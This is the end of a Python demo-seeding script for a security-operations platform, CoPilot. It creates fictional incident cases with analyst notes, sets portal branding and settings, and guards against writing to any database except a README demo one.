        # Today's cases last, so they lead every "latest" list.
        await self.case(
            "Commodity stealer loader on NWH-WS-2231",
            [by_id[heroes["nwh_ps"].id]],
            "IN_PROGRESS",
            now - datetime.timedelta(hours=3),
            "dsingh",
            description="Encoded PowerShell on a nursing-station workstation reflectively loaded a .NET stealer.",
            notes=[("dsingh", "Domain blocked at the DNS filter. Memory acquisition in progress.")],
            task_progress=0.4,
        )
        await self.case(
            "Phishing campaign targeting Acme Manufacturing",
            [by_id[heroes["phish"].id]],
            "OPEN",
            now - datetime.timedelta(hours=2, minutes=40),
            "jkim",
            description="Supplier-invoice lure sent to 14 Acme mailboxes; one user clicked. Scoping recipients and clicks.",
            notes=[("jkim", "Message trace: 14 recipients, 1 click (s.novak). Purge queued in Defender for Office 365.")],
            task_progress=0.25,
        )
        travel_case = await self.case(
            "Account compromise investigation: m.chen",
            [by_id[heroes["travel"].id]],
            "PENDING_CUSTOMER",
            now - datetime.timedelta(hours=6, minutes=30),
            "tobias.weber",
            description="Impossible travel followed by a new MFA registration and an inbox forwarding rule on m.chen's account.",
            notes=[("tobias.weber", "Forwarding rule removed. Need Acme IT to confirm whether the new authenticator belongs to m.chen.")],
            task_progress=0.5,
        )
        hero = heroes["hero"]
        contained = hero.alert_creation_time + datetime.timedelta(minutes=3)
        hero_case = await self.case(
            "Credential theft on ACME-WS-0142",
            [by_id[hero.id], by_id[heroes["macro"].id], by_id[heroes["powershell"].id]],
            "IN_PROGRESS",
            hero.alert_creation_time + datetime.timedelta(minutes=4),
            "maria.lopez",
            description=(
                "Macro-enabled invoice opened by l.brandt led to an encoded PowerShell download cradle and a renamed mimikatz "
                "binary dumping LSASS on ACME-WS-0142. Host contained; scoping lateral movement and resetting credentials."
            ),
            notes=[
                (
                    "maria.lopez",
                    f"Falcon containment confirmed at {contained:%H:%M} UTC. Memory image collection running (Windows.Memory.Acquisition).",
                ),
                (
                    "jkim",
                    "No logons from l.brandt on other hosts since the macro ran. DC-01 shows one failed 4625 from the host, nothing else.",
                ),
                (
                    "maria.lopez",
                    "Acme IT reset l.brandt plus svc_print and adm.fischer (cached on the host). Waiting for the hunt results.",
                ),
            ],
            task_progress=0.6,
        )
        await self.s.commit()
        return {"hero_case": hero_case, "travel_case": travel_case}

    # ---- portal ------------------------------------------------------------------------

    async def portal(self) -> None:
        s = self.s
        # The portal's global branding: CoPilot's own logo, from the analyst frontend.
        logo = Path(__file__).resolve().parents[2] / "frontend" / "public" / "logo.svg"
        logo_b64 = base64.b64encode(logo.read_bytes()).decode() if logo.exists() else None
        settings = (await s.execute(select(CustomerPortalSettings).order_by(CustomerPortalSettings.id))).scalars().first()
        if settings is None:
            settings = CustomerPortalSettings()
            s.add(settings)
        settings.title = "CoPilot"
        settings.logo_base64 = logo_b64
        settings.logo_mime_type = "image/svg+xml" if logo_b64 else None
        settings.updated_at = self.now - datetime.timedelta(days=60)
        for code in ("ACME", "NWH"):
            s.add(CustomerPortalAiReportSettings(customer_code=code, enabled=True, allow_customer_requests=True, daily_request_limit=10))
            s.add(CustomerPortalSlaSettings(customer_code=code, enabled=True))
        await s.commit()


async def seed(engine) -> dict:
    now = _now()
    async with AsyncSession(engine, expire_on_commit=False) as s:
        await cleanup(s)
        seeder = Seeder(s, now)
        await seeder.customers_and_users()
        await seeder.agents()
        await seeder.case_templates()
        await seeder.history()
        heroes = await seeder.heroes()
        await seeder.ai_reports(heroes)
        cases = await seeder.cases(heroes)
        await seeder.portal()
    return {
        "admin": {"username": ADMIN, "password": ADMIN_PASSWORD},
        "analysts": {"usernames": list(ANALYSTS), "password": ANALYST_PASSWORD},
        "portal_user": {"username": PORTAL_USER, "password": PORTAL_PASSWORD, "customer_code": "ACME"},
        "customers": {code: info["name"] for code, info in CUSTOMERS.items()},
        "ids": {
            "hero_alert": heroes["hero"].id,
            "travel_alert": heroes["travel"].id,
            "nwh_alert": heroes["nwh_ps"].id,
            "hero_case": cases["hero_case"].id,
            "risk_alert": heroes["risk"].id,
            "travel_case": cases["travel_case"].id,
        },
        "counts": seeder.counts,
    }


def _check_target() -> None:
    database = urlparse(DB_URL).path.lstrip("/")
    if not database.endswith("_readme") and os.environ.get("README_DEMO_FORCE") != "1":
        raise SystemExit(
            f"Refusing to write to database {database!r}: its name must end in '_readme' (set README_DEMO_FORCE=1 to override).",
        )


async def _main(command: str) -> None:
    _check_target()
    engine = create_async_engine(DB_URL)
    try:
        if command == "seed":
            print(json.dumps(await seed(engine), indent=2))
        elif command == "cleanup":
            async with AsyncSession(engine, expire_on_commit=False) as s:
                await cleanup(s)
            print("cleaned")
        else:
            raise SystemExit("usage: seed_demo.py seed|cleanup")
    finally:
        await engine.dispose()


if __name__ == "__main__":
    asyncio.run(_main(sys.argv[1] if len(sys.argv) > 1 else "seed"))
